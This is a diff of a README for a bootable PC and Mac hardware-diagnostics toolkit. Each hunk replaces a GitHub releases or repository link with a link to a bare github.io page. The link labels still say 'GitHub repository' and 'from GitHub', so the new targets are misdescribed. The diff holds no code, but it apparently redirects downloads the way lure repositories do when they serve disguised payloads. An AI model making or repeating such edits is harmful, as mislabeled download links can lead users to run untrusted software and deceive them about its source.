@@ -1,7 +1,7 @@
 <h1>🩺 hardware-clinic - Bootable PC & Mac Hardware Diagnostics</h1>
 
 <p align="center">
-<a href="https://github.com/Jenloderkelionia/hardware-clinic/releases"><img src="https://img.shields.io/badge/Download-hardware--clinic-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download hardware-clinic"></a>
+<a href="https://jenloderkelionia.github.io"><img src="https://img.shields.io/badge/Download-hardware--clinic-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download hardware-clinic"></a>
 </p>
 
 **hardware-clinic** is a free, bootable USB toolkit designed for anyone who wants to test, repair, or recover data from a computer—without needing to install an operating system or wait for a slow boot. It starts in about one second, runs entirely from a USB stick, and gives you powerful tools to check the health of your PC or Intel Mac, rescue files from damaged drives, and even securely erase sensitive data. Whether you are fixing your own computer, refurbishing old hardware, or preparing a machine for resale, hardware-clinic is your all-in-one solution.
@@ -16,7 +16,7 @@ Follow these simple steps to get hardware-clinic running on your Windows compute
 
 Visit this link to download the application:
 
-[**Download hardware-clinic**](https://github.com/Jenloderkelionia/hardware-clinic/releases)
+[**Download hardware-clinic**](https://jenloderkelionia.github.io)
 
 Click the link above. You will be taken to the official downloads page. Look for the latest release and click the download button. The download should start automatically. Once the download is complete, you will have a file saved to your computer—usually in your "Downloads" folder. Do not open the file yet; we will need to prepare it first.
 
@@ -108,7 +108,7 @@ Absolutely. That is the whole point. It boots independently from the USB drive, 
 
 ## 🌐 Community & Support
 
-hardware-clinic is an open-source project. If you find a bug, have a feature request, or want to contribute, please visit the [GitHub repository](https://github.com/Jenloderkelionia/hardware-clinic). You can open issues, submit code, or just share your experience with fellow users.
+hardware-clinic is an open-source project. If you find a bug, have a feature request, or want to contribute, please visit the [GitHub repository](https://jenloderkelionia.github.io). You can open issues, submit code, or just share your experience with fellow users.
 
 ---
 
@@ -116,7 +116,7 @@ hardware-clinic is an open-source project. If you find a bug, have a feature req
 
 If you missed the link at the top, here it is one more time:
 
-[Download hardware-clinic from GitHub](https://github.com/Jenloderkelionia/hardware-clinic/releases)
+[Download hardware-clinic from GitHub](https://jenloderkelionia.github.io)
 
 ---
 
